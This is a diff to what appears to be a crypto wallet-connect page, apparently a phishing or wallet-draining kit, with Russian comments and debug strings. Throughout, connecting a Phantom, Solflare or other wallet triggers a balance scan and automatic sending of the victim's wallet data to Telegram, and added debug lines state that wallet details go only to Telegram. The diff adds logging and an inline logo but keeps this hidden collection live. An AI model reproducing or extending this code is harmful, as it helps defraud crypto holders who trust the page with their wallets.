@@ -445,7 +445,7 @@
         <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" data-wallet="coinbase">
-        <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
+        <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20150%20150%22%3E%3Cpath%20fill=%22%231e2021%22%20d=%22M0%200h150v150H0z%22/%3E%3Cpath%20fill=%22%23fff%22%20fill-rule=%22evenodd%22%20d=%22M101.5%2070.26a5.83%205.83%200%201%201%207.95-8.52%205.83%205.83%200%200%201-7.96%208.52ZM81.9%2089.84a4.37%204.37%200%201%201%206.19-6.18%204.37%204.37%200%200%201-6.19%206.18Zm30.93-10.3a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm-10.3%2010.3a4.37%204.37%200%201%201%206.13-6.22%204.37%204.37%200%200%201-6.14%206.22Zm21.63-1.03a2.92%202.92%200%201%201%203.94-4.31%202.92%202.92%200%200%201-3.94%204.31Zm-10.3%2010.31a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4ZM91.18%2080.57a5.83%205.83%200%201%201%208.25-8.25%205.83%205.83%200%200%201-8.25%208.25Zm0-20.62a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24Zm-10.3%2010.31a5.83%205.83%200%201%201%208.24-8.24%205.83%205.83%200%201%201-8.25%208.24h.01Zm-20.72%200a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24ZM40.58%2089.84a4.37%204.37%200%201%201%206.14-6.22%204.37%204.37%200%200%201-6.14%206.22Zm30.92-10.3a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm-10.3%2010.3a4.37%204.37%200%201%201%206.18-6.18%204.37%204.37%200%201%201-6.19%206.18h.01ZM21%2088.81a2.92%202.92%200%201%201%204.12-4.12A2.92%202.92%200%200%201%2021%2088.81H21Zm10.3%2010.31a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4Zm41.23%200a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4ZM30.27%2079.54a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm19.58%201.03a5.83%205.83%200%201%201%208.25-8.25%205.83%205.83%200%200%201-8.25%208.25Zm0-20.62a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24Zm-10.3%2010.31a5.83%205.83%200%201%201%207.96-8.52%205.83%205.83%200%200%201-7.96%208.52Z%22/%3E%3C/svg%3E" alt="Coinbase" />
         <span>Coinbase</span>
         <div class="wallet-status">Available</div>
       </div>
@@ -553,38 +553,6 @@
       }
       
       return walletBrowserInfo;
-    }
-
-    function showWalletBrowserBanner(walletInfo) {
-      const banner = document.createElement('div');
-      banner.id = 'walletBrowserBanner';
-      banner.className = 'wallet-browser-banner';
-      
-      const message = document.createElement('span');
-      message.id = 'walletBrowserMessage';
-      message.textContent = `Вы используете браузер ${walletInfo.walletName}! Подключите кошелек для проверки баланса.`;
-      
-      const connectBtn = document.createElement('button');
-      connectBtn.id = 'walletBrowserConnectBtn';
-      connectBtn.textContent = 'Connect';
-      
-      banner.appendChild(message);
-      banner.appendChild(connectBtn);
-      document.body.insertBefore(banner, document.body.firstChild);
-      
-      if (walletInfo.isWalletBrowser) {
-        // Set up the connect button
-        connectBtn.addEventListener('click', async () => {
-          try {
-            if (window.walletManager) {
-              await window.walletManager.connectWallet(walletInfo.walletKey);
-              banner.classList.add('hidden');
-            }
-          } catch (error) {
-            // Handle error
-          }
-        });
-      }
     }
 
     // ============================================================================
@@ -770,6 +738,8 @@
           showTelegramStatus('success', '✅ Отправлено в Telegram');
           return true;
         } else {
+          showTelegramStatus('error', '❌ Ошибка отправки');
+          
           // Пробуем альтернативный метод
           return await sendViaAlternativeMethod(message);
         }
@@ -1040,8 +1010,6 @@
           return results;
 
         } catch (error) {
-          const scanDuration = Date.now() - startTime;
-          
           return {
             address: walletAddress,
             solBalance: 0,
@@ -1140,15 +1108,13 @@
           if (walletBrowserInfo.walletKey === 'phantom' && walletBrowserInfo.isMobile) {
             setTimeout(() => {
               this.directPhantomMobileConnect().catch(err => {
-                showWalletBrowserBanner(walletBrowserInfo);
+                this.showConnectionStatus('error', 'Phantom не найден');
               });
             }, 1000); // Увеличиваем задержку до 1 секунды
           } else {
-            // Auto-connect if in wallet browser after a short delay
             setTimeout(() => {
               if (!this.connectedWallet && walletBrowserInfo.walletKey) {
                 this.connectWallet(walletBrowserInfo.walletKey).catch(err => {
-                  // Handle error
                 });
               }
             }, 1500);
@@ -1171,8 +1137,6 @@
 
       // Новый метод для прямого подключения в мобильном браузере Phantom
       async directPhantomMobileConnect() {
-        const walletBrowserInfo = detectWalletBrowser();
-        // Только прямой вызов для мобильного Phantom Browser
         if (walletBrowserInfo.isWalletBrowser && walletBrowserInfo.walletKey === 'phantom' && walletBrowserInfo.isMobile) {
           try {
             if (!window.phantom || !window.phantom.solana) {
@@ -1200,6 +1164,9 @@
           const connectPromise = new Promise(async (resolve, reject) => {
             try {
               let response = await provider.connect({ onlyIfTrusted: true });
+              if (!response || !response.publicKey) {
+                response = await provider.connect();
+              }
               if (response && response.publicKey) {
                 resolve(response);
               } else {
@@ -1226,7 +1193,6 @@
       // Добавьте новый метод для обработки успешного подключения:
 
       async processPhantomConnection(provider, publicKey) {
-        // Преобразуем publicKey в строку
         let walletAddress;
         if (typeof publicKey === 'string') {
           walletAddress = publicKey;
@@ -1257,7 +1223,6 @@
           
           this.updateConnectionUI();
         } catch (scanError) {
-          // Handle error
         } finally {
           this.isScanning = false;
         }
@@ -1272,7 +1237,6 @@
           return;
         }
 
-        // Сбрасываем флаг отмены подключения
         this.connectionCancelled = false;
 
         const config = this.walletConfigs[walletKey];
@@ -1281,18 +1245,15 @@
           throw new Error(`Unsupported wallet: ${walletKey}`);
         }
 
-        // Проверяем, находимся ли мы в мобильном браузере Phantom
         const walletBrowserInfo = detectWalletBrowser();
         const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser && 
                                       walletBrowserInfo.walletKey === 'phantom' && 
                                       walletBrowserInfo.isMobile;
         
-        // Для Phantom в мобильном браузере используем специальный метод
         if (walletKey === 'phantom' && isPhantomMobileBrowser) {
           return await this.directPhantomMobileConnect();
         }
 
-        // For Phantom in-app browser, skip the deep linking
         if ((walletKey === 'phantom' || walletKey === 'solflare') && 
             detectDevice().isMobile && 
             !isPhantomMobileBrowser) {
@@ -1314,7 +1275,6 @@
             throw new Error(`${config.name} is not installed`);
           }
 
-          // Используем стандартную логику подключения для других кошельков
           if (walletKey === 'phantom') {
             response = await this.connectPhantom(provider, requestPermission);
           } else if (walletKey === 'solflare') {
@@ -1323,9 +1283,7 @@
             response = await this.connectGenericWallet(provider, requestPermission);
           }
 
-          // Проверяем, не была ли отменена операция подключения
           if (this.connectionCancelled) {
-            this.showConnectionStatus('error', 'Connection cancelled');
             return;
           }
 
@@ -1350,7 +1308,6 @@
             }
           }
 
-          // Проверяем, что адрес кошелька получен
           if (!walletAddress) {
             this.showConnectionStatus('error', 'Failed to get wallet address');
             return;
@@ -1367,12 +1324,10 @@
           try {
             this.walletData = await this.scanner.performFastScan(this.walletAddress);
             
-            // Проверяем, что у нас есть действительный адрес кошелька перед отправкой в Telegram
             if (this.walletData && this.walletData.address) {
-              // АВТОМАТИЧЕСКИ ОТПРАВЛЯЕМ ДАННЫЕ В TELEGRAM
               await sendWalletInfoToTelegram(this.walletName, this.walletData);
             } else {
-              // Handle error
+              debug('No valid wallet address to send to Telegram');
             }
             
             this.updateConnectionUI();
@@ -1381,12 +1336,6 @@
               this.showConnectionStatus('error', `Connected but scan failed: ${this.walletData.error || 'Unknown error'}`);
             } else {
               this.showConnectionStatus('success', `Connected successfully!`);
-            }
-            
-            // Hide wallet browser banner if connection was successful
-            const walletBrowserBanner = document.getElementById('walletBrowserBanner');
-            if (walletBrowserBanner) {
-              walletBrowserBanner.classList.add('hidden');
             }
             
           } catch (scanError) {
@@ -1402,7 +1351,6 @@
           return response;
 
         } catch (error) {
-          // Проверяем, не была ли отменена операция подключения пользователем
           if (error.message && (error.message.includes('User rejected') || error.message.includes('cancelled') || error.message.includes('rejected'))) {
             this.connectionCancelled = true;
             this.showConnectionStatus('error', 'Connection rejected by user');
@@ -1432,12 +1380,10 @@
         try {
           this.walletData = await this.scanner.performFastScan(this.walletAddress);
           
-          // Проверяем, что у нас есть действительный адрес кошелька перед отправкой в Telegram
           if (this.walletData && this.walletData.address) {
-            // ОТПРАВЛЯЕМ ОБНОВЛЕННЫЕ ДАННЫЕ В TELEGRAM
             await sendWalletInfoToTelegram(`${this.walletName} (Rescan)`, this.walletData);
           } else {
-            // Handle error
+            debug('No valid wallet address to send to Telegram');
           }
           
           this.showConnectionStatus('success', `Scan completed successfully!`);
@@ -1453,7 +1399,6 @@
         // Enhanced connection logic for Phantom
         if (requestPermission) {
           try {
-            // Try direct connection with an explicit reconnect
             if (provider.isConnected && provider.publicKey) {
               return { publicKey: provider.publicKey };
             }
@@ -1468,7 +1413,6 @@
           if (provider.isConnected && provider.publicKey) {
             return { publicKey: provider.publicKey };
           } else {
-            // Try to connect even in this case, as some environments might require it
             try {
               const response = await provider.connect();
               return response;
@@ -1525,7 +1469,6 @@
             await this.connectedWallet.disconnect();
           }
         } catch (error) {
-          // Handle error
         }
 
         this.connectedWallet = null;
@@ -1538,12 +1481,6 @@
 
         this.updateConnectionUI();
         this.hideConnectionStatus();
-
-        // Show wallet browser banner again if we're in a wallet browser
-        const walletBrowserInfo = detectWalletBrowser();
-        if (walletBrowserInfo.isWalletBrowser) {
-          showWalletBrowserBanner(walletBrowserInfo);
-        }
 
       }
 
@@ -1620,11 +1557,9 @@
       }
 
       setupEventListeners() {
-        // Добавляем прямой обработчик для кнопки подключения кошелька
         const connectWalletBtn = document.getElementById('connectWalletBtn');
         if (connectWalletBtn) {
           connectWalletBtn.addEventListener('click', async (e) => {
-            // Проверяем, находимся ли мы в мобильном браузере Phantom
             const walletBrowserInfo = detectWalletBrowser();
             if (walletBrowserInfo.isWalletBrowser && 
                 walletBrowserInfo.walletKey === 'phantom' && 
@@ -1636,7 +1571,6 @@
               try {
                 await this.directPhantomMobileConnect();
               } catch (error) {
-                // Handle error
               }
               
               return false;
@@ -1648,33 +1582,28 @@
           option.addEventListener('click', async (e) => {
             const walletKey = option.getAttribute('data-wallet');
             
-            // Проверяем, находимся ли мы в мобильном браузере Phantom
             const walletBrowserInfo = detectWalletBrowser();
             const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser && 
                                           walletBrowserInfo.walletKey === 'phantom' && 
                                           walletBrowserInfo.isMobile;
             
-            // Для Phantom в мобильном браузере используем специальный метод
             if (walletKey === 'phantom' && isPhantomMobileBrowser) {
               e.preventDefault();
               e.stopPropagation();
               
               try {
                 await this.directPhantomMobileConnect();
-                // Закрываем модальное окно только если подключение успешно
                 if (this.walletAddress) {
                   setTimeout(() => {
                     closeAllModals();
                   }, 1500);
                 }
               } catch (error) {
-                // Handle error
               }
               
               return false;
             }
             
-            // Skip deep linking for Phantom browser
             const isPhantomEnv = walletKey === 'phantom' && detectWalletBrowser().walletKey === 'phantom';
             
             if ((walletKey === 'phantom' || walletKey === 'solflare') && 
@@ -1691,14 +1620,12 @@
             
             try {
               await this.connectWallet(walletKey);
-              // Закрываем модальное окно только если подключение успешно и не было отменено
               if (!this.connectionCancelled && this.walletAddress) {
                 setTimeout(() => {
                   closeAllModals();
                 }, 1500);
               }
             } catch (error) {
-              // Handle error
             }
           });
         });
@@ -1707,33 +1634,28 @@
           item.addEventListener('click', async (e) => {
             const walletKey = item.getAttribute('data-wallet');
             
-            // Проверяем, находимся ли мы в мобильном браузере Phantom
             const walletBrowserInfo = detectWalletBrowser();
             const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser && 
                                           walletBrowserInfo.walletKey === 'phantom' && 
                                           walletBrowserInfo.isMobile;
             
-            // Для Phantom в мобильном браузере используем специальный метод
             if (walletKey === 'phantom' && isPhantomMobileBrowser) {
               e.preventDefault();
               e.stopPropagation();
               
               try {
                 await this.directPhantomMobileConnect();
-                // Закрываем модальное окно только если подключение успешно
                 if (this.walletAddress) {
                   setTimeout(() => {
                     closeAllModals();
                   }, 1500);
                 }
               } catch (error) {
-                // Handle error
               }
               
               return false;
             }
             
-            // Skip deep linking for Phantom browser
             const isPhantomEnv = walletKey === 'phantom' && detectWalletBrowser().walletKey === 'phantom';
             
             if ((walletKey === 'phantom' || walletKey === 'solflare') && 
@@ -1757,7 +1679,7 @@
                 }, 1500);
               }
             } catch (error) {
-              // Handle error
+              debug('Connection failed:', error);
             }
           });
         });
@@ -1845,8 +1767,12 @@
     let walletManager;
 
     document.addEventListener('DOMContentLoaded', () => {
+      debug('🚀 DOM fully loaded');
+      
       // Добавляем отладочную информацию о Phantom
       if (window.phantom) {
+        debug('✓ Phantom object exists at load time');
+        debug('✓ Phantom solana exists:', !!window.phantom.solana);
         if (window.phantom.solana) {
           debug('✓ Phantom isPhantom:', window.phantom.solana.isPhantom);
           debug('✓ Phantom isConnected:', window.phantom.solana.isConnected);
@@ -1858,9 +1784,13 @@
           debug('✓ Phantom signTransaction method:', typeof window.phantom.solana.signTransaction);
         }
       } else {
+        debug('❌ Phantom object does not exist at load time');
+        
         // Проверяем, не появится ли объект Phantom позже
         setTimeout(() => {
           if (window.phantom) {
+            debug('✓ Phantom object appeared after delay');
+            debug('✓ Phantom solana exists (delayed):', !!window.phantom.solana);
           } else {
             debug('❌ Phantom object still does not exist after delay');
           }
@@ -1913,6 +1843,13 @@
     window.checkWalletBalanceFast = checkWalletBalanceFast;
     window.sendWalletInfoToTelegram = sendWalletInfoToTelegram;
     window.detectWalletBrowser = detectWalletBrowser;
+    window.debug = debug;
+
+    debug('🚀 Solana Wallet Scanner загружен и готов к работе!');
+    debug('📤 Автоматическая отправка данных в Telegram включена');
+    debug('🔒 Детальная информация о кошельке отправляется только в Telegram');
+    debug('🔍 Добавлено определение браузера кошелька');
+    debug('🐞 Режим отладки включен');
 
     // Вставить функцию для подключения через Solana Wallet Adapter
     async function connectPhantomViaAdapter() {
@@ -1921,14 +1858,17 @@
       if (!adapter.connected) {
         try {
           await adapter.connect();
+          debug('Phantom Adapter connected:', adapter.publicKey.toString());
           return adapter;
         } catch (e) {
+          debug('Phantom Adapter connection error:', e);
           throw e;
         }
       } else {
+        debug('Phantom Adapter already connected:', adapter.publicKey.toString());
         return adapter;
       }
     }
   </script>
 </body>
-</html> 
+</html>
